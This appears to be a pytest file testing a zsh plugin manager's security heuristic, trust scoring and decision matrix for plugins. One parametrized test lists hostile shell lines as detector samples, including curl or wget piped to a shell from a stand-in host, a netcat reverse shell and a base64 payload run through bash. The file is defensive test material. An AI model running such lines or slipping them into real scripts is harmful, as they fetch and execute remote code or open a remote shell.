"""Tests for Layer 1 security heuristics, trust scoring, and decision matrix.

Spec: Phase C Security Heuristic
Authoritative Reference: decision_matrix_authoritative, trust_signals_authoritative
"""
from __future__ import annotations

import subprocess
import time
from pathlib import Path

import pytest
from core.analyzer import (
    ALLOWED_ORGS,
    DANGEROUS_PATTERNS,
    _apply_decision_matrix,
    _security_heuristic,
    _trust_score,
    analyze_tool,
)
from core.models import AnalysisResult, DetectedSignals, Recommendation, Strategy


# ─── Decision Matrix Tests (All 8 Authoritative Rows) ───────────────

def test_decision_matrix_row1_high_eager():
    """Row 1: trust=high, perf=eager -> final=eager, report=agree."""
    strat, report, blocked, override = _apply_decision_matrix("high", "eager", False)
    assert strat == "eager"
    assert report == "agree"
    assert not blocked
    assert not override


def test_decision_matrix_row2_high_lazy():
    """Row 2: trust=high, perf=lazy -> final=lazy, report=agree."""
    strat, report, blocked, override = _apply_decision_matrix("high", "lazy", False)
    assert strat == "lazy"
    assert report == "agree"
    assert not blocked
    assert not override


def test_decision_matrix_row3_medium_eager():
    """Row 3: trust=medium, perf=eager -> final=eager, report=warning — medium trust."""
    strat, report, blocked, override = _apply_decision_matrix("medium", "eager", False)
    assert strat == "eager"
    assert report == "warning — medium trust"
    assert not blocked
    assert not override


def test_decision_matrix_row4_medium_lazy():
    """Row 4: trust=medium, perf=lazy -> final=lazy, report=warning — medium trust."""
    strat, report, blocked, override = _apply_decision_matrix("medium", "lazy", False)
    assert strat == "lazy"
    assert report == "warning — medium trust"
    assert not blocked
    assert not override


def test_decision_matrix_row5_low_eager_conflict():
    """Row 5: trust=low, perf=eager -> final=deferred, CONFLICT report."""
    strat, report, blocked, override = _apply_decision_matrix("low", "eager", False)
    assert strat == "deferred"
    assert "CONFLICT — perf=eager, security=deferred (low trust)" in report
    assert not blocked
    assert not override


def test_decision_matrix_row6_low_lazy_agree():
    """Row 6: trust=low, perf=lazy -> final=lazy, agree (low trust)."""
    strat, report, blocked, override = _apply_decision_matrix("low", "lazy", False)
    assert strat == "lazy"
    assert report == "agree (low trust)"
    assert not blocked
    assert not override


def test_decision_matrix_row7_unknown_dangerous_blocked():
    """Row 7: trust=unknown, contains_dangerous=true -> final=BLOCKED, BLOCKER report."""
    strat, report, blocked, override = _apply_decision_matrix("unknown", "lazy", True)
    assert strat == "BLOCKED"
    assert "BLOCKER — refuse unless --force" in report
    assert blocked
    assert override


def test_decision_matrix_row8_unknown_safe_deferred():
    """Row 8: trust=unknown, contains_dangerous=false -> final=deferred, warning."""
    strat, report, blocked, override = _apply_decision_matrix("unknown", "eager", False)
    assert strat == "deferred"
    assert "warning — unknown trust, deferring" in report
    assert not blocked
    assert not override


# ─── Trust Signal Tests ──────────────────────────────────────────────

def test_allowlist_known_orgs():
    """Verify all 10 authoritative orgs in ALLOWED_ORGS."""
    expected = {
        "zsh-users", "ohmyzsh", "romkatv", "Pakrohk", "sobolevn",
        "Aloxaf", "zdharma-continuum", "mfaerevaag", "MichaelAquilina", "marlonrichert"
    }
    assert ALLOWED_ORGS == expected


def test_trust_signal_known_org_parsing(tmp_path: Path):
    """Test known_org signal detection via path and source strings."""
    # Matched org in path
    p1 = tmp_path / "vendor" / "Pakrohk" / "ziro-ghost"
    p1.mkdir(parents=True)
    sec1 = _security_heuristic(p1)
    assert sec1["signals"]["known_org"] is True

    # Matched org via source slug
    sec2 = _security_heuristic(tmp_path / "nonexistent", source="zsh-users/zsh-autosuggestions")
    assert sec2["signals"]["known_org"] is True

    # Unknown org
    p3 = tmp_path / "vendor" / "unknown-hacker" / "evil-plugin"
    p3.mkdir(parents=True)
    sec3 = _security_heuristic(p3)
    assert sec3["signals"]["known_org"] is False


def test_trust_score_calculation():
    """Test score calculation and level mapping."""
    # 4 signals true -> high
    score, level = _trust_score({"known_org": True, "has_release_tag": True, "recent_activity": True, "source_clean": True})
    assert score == 4
    assert level == "high"

    # 3 signals true -> high
    score, level = _trust_score({"known_org": True, "has_release_tag": False, "recent_activity": True, "source_clean": True})
    assert score == 3
    assert level == "high"

    # 2 signals true -> medium
    score, level = _trust_score({"known_org": True, "has_release_tag": False, "recent_activity": False, "source_clean": True})
    assert score == 2
    assert level == "medium"

    # 1 signal true -> low
    score, level = _trust_score({"known_org": False, "has_release_tag": False, "recent_activity": False, "source_clean": True})
    assert score == 1
    assert level == "low"

    # Source not readable -> unknown
    score, level = _trust_score({}, source_readable=False)
    assert score is None
    assert level == "unknown"


# ─── Dangerous Pattern Detection Tests ──────────────────────────────

@pytest.mark.parametrize(
    "pattern_str,sample_code",
    [
        ("sudo", "sudo apt install evil"),
        ("curl_pipe_sh", "curl -sSL https://bad.com | sh"),
        ("curl_pipe_bash", "curl https://bad.com | bash"),
        ("curl_pipe_zsh", "curl https://bad.com | zsh"),
        ("wget_pipe_sh", "wget -O- https://bad.com | sh"),
        ("eval_curl", 'eval "$(curl -s https://bad.com)"'),
        ("eval_wget", 'eval "$(wget -qO- https://bad.com)"'),
        ("source_http", "source https://bad.com/pwn.zsh"),
        ("dev_tcp", ". /dev/tcp/1.2.3.4/80"),
        ("netcat_exec", "nc -e /bin/sh 1.2.3.4 4444"),
        ("base64_decode_sh", "echo dGVzdA== | base64 -d | bash"),
    ],
)
def test_dangerous_patterns_detected(tmp_path: Path, pattern_str: str, sample_code: str):
    """Verify each dangerous shell pattern is detected and invalidates source_clean."""
    plugin_dir = tmp_path / f"plugin_{pattern_str}"
    plugin_dir.mkdir(parents=True)
    script = plugin_dir / "plugin.zsh"
    script.write_text(f"# header\n{sample_code}\n", encoding="utf-8")

    sec = _security_heuristic(plugin_dir)
    assert sec["signals"]["source_clean"] is False
    assert len(sec["dangerous_found"]) > 0


def test_clean_source_no_false_positives(tmp_path: Path):
    """Test standard clean zsh script triggers no security flags."""
    plugin_dir = tmp_path / "clean_plugin"
    plugin_dir.mkdir(parents=True)
    script = plugin_dir / "clean.plugin.zsh"
    script.write_text(
        """
        # A clean plugin
        alias g='git'
        my_helper() {
            local dir="$1"
            echo "Entering $dir"
            cd "$dir"
        }
        """,
        encoding="utf-8",
    )
    sec = _security_heuristic(plugin_dir)
    assert sec["signals"]["source_clean"] is True
    assert len(sec["dangerous_found"]) == 0


# ─── AnalysisResult Integration Tests ────────────────────────────────

def test_analysis_result_security_fields():
    """Verify AnalysisResult dataclass accepts and serializes security fields."""
    res = AnalysisResult(
        plugin="test-plugin",
        source="https://github.com/test/plugin",
        detected=DetectedSignals(),
        recommended=Recommendation(strategy=Strategy.EAGER),
        confidence=0.8,
        trust_score=3,
        trust_level="high",
        security_notes=["all checks passed"],
        blocked=False,
        override_required=False,
    )
    d = res.to_dict()
    assert d["trust_score"] == 3
    assert d["trust_level"] == "high"
    assert d["security_notes"] == ["all checks passed"]
    assert d["blocked"] is False
    assert d["override_required"] is False


def test_analyze_tool_security_integration():
    """Verify analyze_tool attaches security fields to tool dict."""
    binary_tool = {
        "name": "starship",
        "type": "binary",
        "category": "prompt",
        "load_method": "eval-cache",
        "init_command": "starship init zsh --print-full-init",
    }
    analyzed = analyze_tool(binary_tool)
    assert analyzed["trust_score"] == 4
    assert analyzed["trust_level"] == "high"
    assert analyzed["blocked"] is False
    assert analyzed["security_report"] == "agree"


def test_analyze_tool_downgrades_untrusted_eager(tmp_path: Path):
    """Verify analyze_tool downgrades untrusted eager plugin to deferred (Row 5)."""
    untrusted_tool = {
        "name": "random-completion",
        "type": "plugin",
        "category": "completion",  # would normally be eager
        "source": "unknown-org/random-completion",
    }
    analyzed = analyze_tool(untrusted_tool)
    # Untrusted org + source not on disk -> unknown or low trust -> downgraded to deferred
    assert analyzed["timing"] == "deferred"
    assert analyzed["trust_level"] in ("low", "unknown")
    assert analyzed["blocked"] is False
